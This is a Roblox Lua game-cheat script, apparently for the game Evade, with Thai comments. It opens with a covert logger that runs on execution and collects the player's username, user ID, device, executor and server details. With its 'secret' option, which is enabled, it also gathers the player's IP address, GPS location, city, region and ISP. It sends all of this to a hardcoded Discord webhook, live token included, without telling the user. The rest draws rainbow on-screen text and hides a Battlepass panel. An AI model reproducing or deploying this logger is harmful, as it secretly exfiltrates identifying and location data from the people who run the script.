--// Config
getgenv().whscript = "‡πÅ‡∏°‡∏û Evade bypass countdown script"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1412800788828258365/yk13Av7fcp8nLLZugFNWNJxY-Td2Bb3K11Jbazrc9JJVcXfmdsRR9i45Ii3s-uqawVo0"  --Put your Webhook Url here
getgenv().ExecLogSecret = true                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        print("1")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC üíª" or "Mobile üì±"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "‡πÑ‡∏°‡πà‡∏°‡∏µ Premium"
            else
                premium = "‡∏°‡∏µ Premium"
            end
        else
            premium = "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏î‡πâ:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "üöÄ ‡∏ï‡∏£‡∏ß‡∏à‡∏û‡∏ö‡∏Å‡∏≤‡∏£ ‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ïüöÄ‡πå",
                ["description"] = "‡∏°‡∏µ Script ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì‡∏ñ‡∏π‡∏Å‡∏£‡∏±‡∏ô ‡∏ô‡∏µ‡πà‡∏Ñ‡∏∑‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "üîç ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö Script",
                        ["value"] = "```üíª ‡∏ä‡∏∑‡πà‡∏≠ Script ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏£‡∏±‡∏ô: " ..
                            getgenv().whscript .. "\n‚è∞ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üë§ ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡∏ó‡∏µ‡πà‡∏£‡∏±‡∏ô Script",
                        ["value"] = "```üß∏ ‡∏ä‡∏∑‡πà‡∏≠‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: " ..
                            player.Name ..
                                "\nüìù ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏•‡πà‡∏ô: " ..
                                    player.DisplayName ..
                                        "\nüÜî ID ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: " ..
                                            userid ..
                                                "\n‚ù§Ô∏è ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô Hp ‡∏Ç‡∏ì‡∏∞‡∏ô‡∏±‡πâ‡∏ô: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\nüîó ‡πÇ‡∏õ‡∏£‡πÑ‡∏ü‡∏•‡πå: ‡∏î‡∏π‡πÇ‡∏õ‡∏£‡πÑ‡∏ü‡∏•‡πå (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üìÖ ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ú‡∏π‡∏±‡πÉ‡∏ä‡πâ",
                        ["value"] = "```üóìÔ∏è ‡∏≠‡∏≤‡∏¢‡∏∏‡∏ö‡∏±‡∏ç‡∏ä‡∏µ: " ..
                            player.AccountAge ..
                                " ‡∏ß‡∏±‡∏ô\nüíé Premium ‡πÄ‡∏ä‡πá‡∏Ñ: " ..
                                    premium ..
                                        "\nüìÖ ‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ö‡∏±‡∏ç‡∏ä‡∏µ: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üéÆ ‡πÄ‡∏Å‡∏° Details",
                        ["value"] = "```üè∑Ô∏è ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡∏°: " ..
                            gameName ..
                                "\nüÜî ‡πÄ‡∏Å‡∏° ID: " ..
                                    gameid ..
                                        "\nüîó ‡πÄ‡∏Å‡∏° Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\nüî¢ ‡πÄ‡∏Å‡∏° Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üïπÔ∏è ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå",
                        ["value"] = "```üë• ‡∏ú‡∏π‡πà‡πÄ‡∏•‡πà‡∏ô‡πÉ‡∏ô‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå: " ..
                            playerCount .. " / " .. maxPlayers .. "\nüïí ‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üì° ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢",
                        ["value"] = "```üì∂ Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üñ•Ô∏è ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡∏£‡∏∞‡∏ö‡∏ö",
                        ["value"] = "```üì∫ Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\nüîç ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏´‡∏ô‡πà‡∏≠‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥: " ..
                                            memoryUsage .. " MB\n‚öôÔ∏è ‡∏ï‡∏±‡∏ß‡∏£‡∏±‡∏ô‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üìç **`‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á Character ‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ`**",
                        ["value"] = "```üìç ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ü™ß **‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(ü§´) ‡∏ó‡∏µ‡πà‡∏≠‡∏¢‡∏π‡πà‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ`**",
                ["value"] = "||(üë£) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(üåÜ) ‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®: " ..
                            ipinfo_table.country ..
                                "||\n||(ü™ü) ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á GPS: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(üèôÔ∏è) ‡∏à‡∏±‡∏á‡∏´‡∏ß‡∏±‡∏î/‡∏£‡∏±‡∏ê/‡πÄ‡∏°‡∏∑‡∏≠‡∏á: " ..
                                            ipinfo_table.city ..
                                                "||\n||(üè°) ‡∏†‡∏π‡∏°‡∏¥‡∏†‡∏≤‡∏Ñ: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(ü™¢) ‡πÇ‡∏Æ‡∏™‡∏ï‡πå: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

--// üí¨ Credit: ChatGPT
--// üåà Smooth Rainbow Credit + Outline + Hide Battlepass GUI (runtime)
--// üê± reworked by ChatGPT (rainbow + safe nil checks + cleaner code)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

----------------------------------------------------------------------
-- üëë CONFIG ZONE
----------------------------------------------------------------------

local DISPLAY_TEXT = "‡∏ó‡∏≥‡πÑ‡∏£‡∏≠‡πà‡∏∞ ‡πÄ‡∏´‡πá‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡∏´‡∏•‡∏≤‡∏¢‡∏ö‡∏±‡∏ç‡∏ä‡∏µ" 
-- üëÜ ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÇ‡∏ä‡∏ß‡πå‡∏Å‡∏•‡∏≤‡∏á‡∏à‡∏≠ (‡∏õ‡∏£‡∏±‡∏ö‡πÑ‡∏î‡πâ)

local Y_OFFSET_PX = 8 - 2
-- ‡πÄ‡∏ò‡∏≠‡∏ö‡∏≠‡∏Å "‡∏Ç‡∏≠‡∏Ç‡∏∂‡πâ‡∏ô‡πÑ‡∏õ‡∏î‡πâ‡∏≤‡∏ô‡∏ö‡∏ô‡∏≠‡∏µ‡∏Å‡∏ã‡∏±‡∏Å 2 ‡∏´‡∏ô‡πà‡∏ß‡∏¢" ‡∏´‡∏ô‡∏π‡πÄ‡∏•‡∏¢‡∏Ç‡∏¢‡∏±‡∏ö‡∏Ç‡∏∂‡πâ‡∏ô (-2 px)

local RAINBOW_UPDATE = 0.03 -- ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡πÄ‡∏•‡∏∑‡πà‡∏≠‡∏ô‡∏™‡∏µ‡∏£‡∏∏‡πâ‡∏á
local OUTLINE_OFFSET = 2    -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏Ç‡∏≠‡∏ö‡∏î‡∏≥‡∏£‡∏≠‡∏ö‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£ (px)

----------------------------------------------------------------------
-- üñº ‡∏™‡∏£‡πâ‡∏≤‡∏á ScreenGui ‡∏´‡∏•‡∏±‡∏Å
----------------------------------------------------------------------

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "‡∏°‡∏≤‡∏î‡∏π‡πÄ‡∏´‡∏µ‡πâ‡∏¢‡∏≠‡∏∞‡πÑ‡∏£"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

----------------------------------------------------------------------
-- üî° ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á TextLabel (‡πÉ‡∏ä‡πâ‡∏ó‡∏±‡πâ‡∏á‡∏ï‡∏±‡∏ß‡∏´‡∏•‡∏±‡∏Å‡πÅ‡∏•‡∏∞‡∏Ç‡∏≠‡∏ö)
----------------------------------------------------------------------

local function createTextLabel(props)
	local lbl = Instance.new("TextLabel")
	lbl.Name = props.Name or "Label"
	lbl.Parent = props.Parent
	lbl.AnchorPoint = Vector2.new(0.5, 0)
	lbl.Position = UDim2.new(0.5, props.OffsetX or 0, 0, (props.OffsetY or 0))
	lbl.Size = UDim2.new(0, 240, 0, 40)
	lbl.BackgroundTransparency = 1
	lbl.Font = Enum.Font.GothamBold
	lbl.TextScaled = true
	lbl.Text = props.Text or ""
	lbl.TextColor3 = props.Color or Color3.new(1,1,1)
	lbl.TextTransparency = 0
	lbl.TextStrokeTransparency = 1 -- ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡∏ó‡∏≥ outline manual ‡πÄ‡∏≠‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß
	return lbl
end

----------------------------------------------------------------------
-- üñ§ ‡∏™‡∏£‡πâ‡∏≤‡∏á outline 8 ‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á‡∏£‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°
----------------------------------------------------------------------

local outlineFolder = Instance.new("Folder")
outlineFolder.Name = "OutlineFolder"
outlineFolder.Parent = ScreenGui

local outlineOffsets = {
	Vector2.new(-1,  0), Vector2.new(1, 0),
	Vector2.new( 0, -1), Vector2.new(0, 1),
	Vector2.new(-1, -1), Vector2.new(-1, 1),
	Vector2.new( 1, -1), Vector2.new(1, 1)
}

for i, dir in ipairs(outlineOffsets) do
	createTextLabel({
		Name = "Outline_"..i,
		Parent = outlineFolder,
		Text = DISPLAY_TEXT,
		Color = Color3.fromRGB(0,0,0),
		OffsetX = dir.X * OUTLINE_OFFSET,
		OffsetY = Y_OFFSET_PX + dir.Y * OUTLINE_OFFSET,
	})
end

----------------------------------------------------------------------
-- üåà ‡∏ä‡∏±‡πâ‡∏ô‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏•‡∏±‡∏Å (‡∏™‡∏µ‡∏£‡∏∏‡πâ‡∏á‡∏ß‡∏¥‡∏ö‡∏ß‡∏±‡∏ö)
----------------------------------------------------------------------

local mainText = createTextLabel({
	Name = "MainText",
	Parent = ScreenGui,
	Text = DISPLAY_TEXT,
	Color = Color3.fromRGB(255,255,255),
	OffsetX = 0,
	OffsetY = Y_OFFSET_PX,
})

-- Gradient ‡∏™‡∏µ‡∏£‡∏∏‡πâ‡∏á
local gradient = Instance.new("UIGradient")
gradient.Rotation = 0
gradient.Parent = mainText

-- palette ‡∏™‡∏µ‡∏£‡∏∏‡πâ‡∏á‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô
local rainbowColors = {
	Color3.fromRGB(255,   0,   0),   -- ‡πÅ‡∏î‡∏á
	Color3.fromRGB(255, 128,   0),   -- ‡∏™‡πâ‡∏°
	Color3.fromRGB(255, 255,   0),   -- ‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡∏á
	Color3.fromRGB(  0, 255,   0),   -- ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ß
	Color3.fromRGB(  0, 128, 255),   -- ‡∏ü‡πâ‡∏≤
	Color3.fromRGB(128,   0, 255),   -- ‡∏°‡πà‡∏ß‡∏á
	Color3.fromRGB(255,   0, 255),   -- ‡∏ä‡∏°‡∏û‡∏π
}

local function buildColorSequence(tbl)
	local seq = {}
	local lastIndex = #tbl - 1
	if lastIndex < 1 then
		-- ‡∏Å‡∏±‡∏ô‡∏û‡∏±‡∏á‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏™‡∏µ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß
		return ColorSequence.new({
			ColorSequenceKeypoint.new(0, tbl[1] or Color3.new(1,1,1)),
			ColorSequenceKeypoint.new(1, tbl[1] or Color3.new(1,1,1)),
		})
	end

	for i, c in ipairs(tbl) do
		local t = (i-1)/lastIndex
		seq[#seq+1] = ColorSequenceKeypoint.new(t, c)
	end
	return ColorSequence.new(seq)
end

gradient.Color = buildColorSequence(rainbowColors)

-- ‡∏•‡∏π‡∏õ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï gradient ‡πÉ‡∏´‡πâ‡πÑ‡∏´‡∏•‡∏ã‡πâ‡∏≤‡∏¢‚Üí‡∏Ç‡∏ß‡∏≤‡πÅ‡∏ö‡∏ö barber pole
task.spawn(function()
	while true do
		task.wait(RAINBOW_UPDATE)
		-- ‡∏¢‡πâ‡∏≤‡∏¢‡∏™‡∏µ‡∏ï‡∏±‡∏ß‡πÅ‡∏£‡∏Å‡πÑ‡∏õ‡∏ó‡πâ‡∏≤‡∏¢ = ‡∏™‡πÑ‡∏•‡∏î‡πå‡∏û‡∏≤‡πÄ‡∏•‡∏ï
		local first = table.remove(rainbowColors, 1)
		table.insert(rainbowColors, first)
		gradient.Color = buildColorSequence(rainbowColors)
	end
end)

----------------------------------------------------------------------
-- üôà ‡∏ã‡πà‡∏≠‡∏ô Battlepass GUI runtime ‡πÅ‡∏ö‡∏ö‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢
-- ‡∏à‡∏∏‡∏î‡∏õ‡∏£‡∏∞‡∏™‡∏á‡∏Ñ‡πå: force .Visible = false ‡∏ï‡∏•‡∏≠‡∏î ‡∏ñ‡πâ‡∏≤‡∏°‡∏±‡∏ô‡πÄ‡∏î‡πâ‡∏á‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡∏Å‡πá‡∏õ‡∏¥‡∏î‡πÉ‡∏´‡∏°‡πà
----------------------------------------------------------------------

-- helper ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏´‡∏≤ descendant ‡πÅ‡∏ö‡∏ö chain ‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢
local function deepFind(root, pathArray)
	local current = root
	for _, name in ipairs(pathArray) do
		if not current then return nil end
		current = current:FindFirstChild(name)
	end
	return current
end

local targetPath = {
	"Menu",
	"Views",
	"Battlepass",
	"ViewPass",
	"Center",
	"ViewPass",
	"Unlocked"
}

RunService.RenderStepped:Connect(function()
	-- ‡∏ã‡πà‡∏≠‡∏ô Battlepass unlock panel
	local unlocked = deepFind(PlayerGui, targetPath)
	if unlocked and unlocked.Visible == true then
		unlocked.Visible = false
	end
end)
